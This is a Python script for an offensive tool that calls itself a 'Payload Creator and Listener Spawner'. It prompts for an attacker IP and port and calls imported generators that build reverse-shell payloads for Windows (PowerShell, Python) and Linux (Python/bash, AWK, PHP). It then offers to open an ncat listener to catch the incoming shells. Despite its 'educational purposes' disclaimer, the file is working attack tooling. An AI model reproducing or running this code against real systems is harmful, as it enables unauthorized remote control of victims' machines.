import socket
import subprocess
import os
import netifaces
import payload_types

from payload_types.windows_python_cmd import generate_python_cmd
from payload_types.windows_python_ps import generate_python_ps
from payload_types.windows_powershell import generate_powershell
from payload_types.linux_python_bash import generate_python_bash
from payload_types.linux_awk import generate_awk
from payload_types.linux_php import generate_php


# create the payload output folder if it does not exist
if not os.path.exists('output'):
    os.makedirs('output')

print('---------------------------------------------------------------------------')
print('''
           @@@@@@@@   @@@@@@   @@@@@@@   @@@@@@@@@@   
          @@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@@@@  
          !@@        @@!  @@@  @@!  @@@  @@! @@! @@!  
          !@!        !@!  @!@  !@!  @!@  !@! !@! !@!  
          !@! @!@!@  @!@!@!@!  @!@!!@!   @!! !!@ @!@  
          !!! !!@!!  !!!@!!!!  !!@!@!    !@!   ! !@!  
          :!!   !!:  !!:  !!!  !!: :!!   !!:     !!:  
          :!:   !::  :!:  !:!  :!:  !:!  :!:     :!:  
           ::: ::::  ::   :::  ::   :::  :::     ::   
           :: :: :    :   : :   :   : :   :      :     ''')
print('')
print('')
print('Payload Creator and Listener Spawner')
print('')
print('Created by 0D1nss0n')
print('')
print('This is for Educational Purposes Only')
print('I am not responsible for any malicious use of this tool')
print('')
print('---------------------------------------------------------------------------')
print('')

def get_local_ip():
    """
    Prompts the user to select an IP address from available network interfaces,
    or allows them to enter a custom IP address.
    Returns the selected IP address as a string.
    """
    interfaces = netifaces.interfaces()
    print('Available network interfaces:')
    for i, interface in enumerate(interfaces):
        addresses = netifaces.ifaddresses(interface)
        if netifaces.AF_INET in addresses:
            ip_address = addresses[netifaces.AF_INET][0]['addr']
            print(f'{i+1}: {interface} ({ip_address})')
        else:
            print(f'{i+1}: {interface} (no IP address)')
            
    print('')
    print('---------------------------------------------------------------------------')
    print('')
    choice = input('Select a network interface (1-' + str(len(interfaces)) + '), or enter a custom IP address: ')
    print('')
    print('---------------------------------------------------------------------------')
    print('')
    
    try:
        choice_num = int(choice)
        if choice_num < 1 or choice_num > len(interfaces):
            raise ValueError
        else:
            ip_address = netifaces.ifaddresses(interfaces[choice_num-1])[netifaces.AF_INET][0]['addr']
            print(f'Using IP address {ip_address} from {interfaces[choice_num-1]}')
            print('')
            print('---------------------------------------------------------------------------')
            print('')
    except ValueError:
        ip_address = choice
        print(f'Using custom IP address {ip_address}')
        print('')
        print('---------------------------------------------------------------------------')
        print('')
    
    return ip_address

lhost = get_local_ip()
lport = int(input('Listener Port: '))
print('')
print('---------------------------------------------------------------------------')
print('')

def choose_payload_type():
    # Prompt the user to choose an operating system type
    while True:
        print("Choose an operating system type:\n1. Windows\n2. Linux")
        os_choice = input().strip()
        if os_choice == '1':
            payload_dict = {
                '1': generate_powershell,
                '2': generate_python_ps,
                '3': generate_python_cmd
            }
            # Prompt the user to choose a payload type for Windows
            while True:
                print('')
                print('---------------------------------------------------------------------------')
                print('')
                print("Choose a payload type:\n1. PowerShell\n2. Python-PS\n3. Python-CMD")
                payload_choice = input().strip()
                if payload_choice in payload_dict:
                    return payload_dict[payload_choice](lhost, int(lport))
                else:
                    print('Invalid option. Please choose either 1, 2, or 3.')
        elif os_choice == '2':
            payload_dict = {
                '1': generate_python_bash,
                '2': generate_awk,
                '3': generate_php
            }
            # Prompt the user to choose a payload type for Linux
            while True:
                print('')
                print('---------------------------------------------------------------------------')
                print('')
                print("Choose a payload type:\n1. Python\n2. AWK\n3. PHP")
                payload_choice = input().strip()
                if payload_choice in payload_dict:
                    return payload_dict[payload_choice](lhost, int(lport))
                else:
                    print('Invalid option. Please choose either 1, 2, or 3.')
        else:
            print('Invalid option. Please choose either 1 or 2.')

choose_payload_type()

def start_listener(lhost, lport):
    # Prompt the user if they want to start a listener
    print('')
    listener = input('Do you want to start a listener on ' + lhost + ':' + str(lport) + '?(y/n): ')

    if listener == 'y':
        # Build the command to start ncat listener
        command = f"gnome-terminal --hide-menubar -- ncat -lvnp {lport}"
        
        # Run the command in a new terminal window
        subprocess.Popen(command.split())

start_listener(lhost, int(lport))
